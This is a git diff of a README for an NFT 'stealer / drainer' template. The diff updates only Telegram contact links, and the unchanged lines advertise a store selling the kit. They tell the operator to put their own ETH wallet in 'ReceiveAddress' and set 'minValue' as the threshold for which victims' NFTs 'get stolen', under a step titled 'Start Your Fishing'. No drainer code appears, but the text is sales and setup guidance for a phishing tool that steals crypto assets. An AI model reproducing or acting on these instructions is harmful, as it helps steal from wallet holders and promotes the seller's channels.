@@ -1,5 +1,5 @@
 
-# ⚠️ For help: https://t.me/nftscem & Store: https://nftscem.sellix.io
+# ⚠️ For help: [@crypto_scem](https://t.me/crypto_scem) & Store: https://nftscem.sellix.io
 
 ## 🖼️ NFT Stealer / Drainer With ApproveAll Method Template 
 
@@ -32,6 +32,6 @@ Step 4: Start Your Fishing
 Edit lines : ReceiveAddress: "YOUR WALLET", replace YOUR WALLET with your ETH wallet address.
 Line "minValue: 0.2," is the minimum value of a NFT before it gets stolen. Example : If you change this value to 1, the script will only steal NFTs that have a value higher to 1.
 
-To get instant support, contact me on telegram : https://t.me/nftscem
+To get instant support, contact me on telegram : [@crypto_scem](https://t.me/crypto_scem)
 
 
